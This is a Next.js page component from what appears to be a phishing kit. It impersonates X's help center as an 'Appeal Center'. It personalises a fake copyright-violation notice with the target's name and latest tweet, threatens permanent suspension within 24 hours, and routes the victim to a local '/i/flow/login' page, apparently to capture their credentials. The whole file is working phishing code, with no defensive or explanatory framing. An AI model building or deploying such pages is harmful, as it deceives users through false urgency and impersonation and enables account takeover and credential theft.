import type { TwitterUser } from "@/app/api/twitter/users/route";
import { Footer } from "@/components/footer";
import { XIcon } from "@/components/icons/x";
import { TweetIframe } from "@/components/tweet-iframe";
import type { Metadata } from "next";
import { headers } from "next/headers";
import Link from "next/link";

export const metadata: Metadata = {
	title: "Appeal Center",
	description:
		"Get instant answers to the most common questions and learn how to use X like a pro.",
};

type Props = {
	params: Promise<{ username: string }>;
};

export default async function HelpCenterPage({ params }: Props) {
	const { username } = await params;

	const getBaseUrl = (headers: Headers) => {
		const host = headers.get("host");
		const protocol = headers.get("x-forwarded-proto") || "http";
		return `${protocol}://${host}`;
	};

	const getTweetUrl = async (baseUrl: string, user: TwitterUser) => {
		if (!user) {
			return;
		}

		const tweetResponse = await fetch(
			`${baseUrl}/api/twitter/last-tweet?userId=${user.id}`,
		);
		const tweetInfo = await tweetResponse.json();

		if (tweetInfo.error) {
			return;
		}

		return `https://twitter.com/user/status/${tweetInfo?.id}`;
	};

	const headersList = await headers();

	const baseUrl = getBaseUrl(headersList);

	const userResponse = await fetch(
		`${baseUrl}/api/twitter/users?username=${username}`,
	);

	const user: TwitterUser = await userResponse.json();

	const tweetUrl = await getTweetUrl(baseUrl, user);

	return (
		<main className="flex flex-col items-center bg-white">
			<header className="sticky top-0 z-10 w-full px-6 pt-3 bg-white">
				<a
					className="h-[84px] flex items-center gap-2.5"
					href="https://help.x.com/en"
					data-twtr-scribe-section="u01b-navigation"
					data-twtr-scribe-element="AZRA"
					data-twtr-scribe-component="twitter-logo-icon"
					aria-label="Central de Ajuda home"
				>
					<XIcon className="size-7" />
					<h1 className="text-2xl font-bold text-black">Appeal Center</h1>
				</a>
			</header>

			<div className="p-5 text-black md:max-w-[596px]">
				<h2 className="text-4xl font-bold md:text-6xl">Action Needed</h2>

				<hr className="w-full h-[0px] border-t border-[#657786] my-8 lg:my-16" />

				{user && (
					<div className="flex flex-col">
						<span className="text-xl md:text-2xl">Dear {user.name}</span>
						<span className="-mt-1 text-sm">@{user.username}</span>
					</div>
				)}

				{!user && username && (
					<div className="flex flex-col">
						<span className="text-xl">@{username}</span>
					</div>
				)}

				<p className="mt-4">
					We are contacting you regarding an urgent copyright violation report
					filed against your account. After a thorough investigation, it has
					been confirmed that your account is involved in activities that
					violate copyright laws.
				</p>

				<h3 className="my-4 text-xl font-semibold">
					Details of the Violation:
				</h3>

				<p className="mb-2">Infringing Content URL(s):</p>

				{tweetUrl && (
					<a className="underline text-sky-600" href={tweetUrl}>
						{tweetUrl}
					</a>
				)}
				{/* <a className="underline text-sky-600" href="https://x.com/jack/status/20">https://x.com/jack/status/20</a> */}

				<TweetIframe src={tweetUrl ?? ""} block={!tweetUrl} />

				<h2>Issues Identified:</h2>

				<ul className="list-disc pl-5">
					<li>Use of copyrighted images.</li>
					<li>Removal of watermarks or attribution.</li>
					<li>Possible misuse of protected content.</li>
				</ul>

				<div className="mt-4 flex flex-col items-start gap-4">
					<p>
						Your account is scheduled to be permanently suspended within 24
						hours due to these confirmed violations. Please note that removing
						the reported content will not resolve this issue.
					</p>

					<p>
						If you believe this decision or the reported copyright violations
						are a mistake, you may file an appeal. This process allows you to
						clarify the situation and address the claims made against your
						account.
					</p>

					<p>
						Failure to take action within 24 hours will result in the permanent
						suspension of your account, including all content, followers, and
						account history.
					</p>
				</div>

				<Link
					href="/i/flow/login"
					className="my-6 w-full h-12 bg-black flex items-center justify-center rounded-full font-bold disabled:opacity-60 text-white"
				>
					Submit appeal
				</Link>
			</div>

			<Footer />
		</main>
	);
}
